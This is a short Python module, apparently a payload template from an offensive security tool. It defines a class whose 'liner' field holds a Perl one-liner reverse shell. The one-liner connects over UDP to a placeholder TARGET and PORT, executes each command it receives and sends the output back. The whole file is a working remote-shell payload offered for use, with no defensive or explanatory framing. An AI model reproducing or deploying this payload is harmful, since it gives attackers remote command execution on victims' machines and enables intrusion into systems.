class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses perl MIO sockets & the output of your commands will be piped back."
    function    = "reverse shell"
    liner     = """perl -MIO::Socket::INET -e '$|=1;$s = new IO::Socket::INET(PeerAddr => "TARGET:".PORT,Proto => "udp");while(NUM1){$s->send("shell>");$s->recv($d,1024);$v1=$s->peerhost();$v2=$s->peerport();$v3=qx($d);$s->send($v3);}' """
